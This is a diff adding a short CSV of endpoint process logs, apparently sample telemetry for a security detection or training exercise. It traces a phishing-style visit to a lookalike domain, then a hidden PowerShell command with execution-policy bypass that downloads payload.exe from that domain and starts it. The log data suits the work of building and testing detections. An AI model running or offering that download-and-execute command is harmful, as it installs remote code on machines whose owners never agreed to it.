@@ -1,0 +1,5 @@
+_time,host_ip,user,process_name,command_line,action
+2026-04-12T10:46:00,192.168.1.50,jsmith,chrome.exe,"chrome.exe --single-argument http://update-microsoft-support.com/login",Allowed
+2026-04-12T10:47:15,192.168.1.50,jsmith,cmd.exe,"cmd.exe /c powershell.exe -w hidden -ep bypass -c ""Invoke-WebRequest -Uri http://update-microsoft-support.com/payload.exe -OutFile C:\Temp\payload.exe; Start-Process C:\Temp\payload.exe""",Allowed
+2026-04-12T10:47:20,192.168.1.50,jsmith,payload.exe,"C:\Temp\payload.exe",Allowed
+2026-04-12T11:10:05,192.168.1.51,tstark,chrome.exe,"chrome.exe --single-argument http://update-microsoft-support.com/login",Allowed
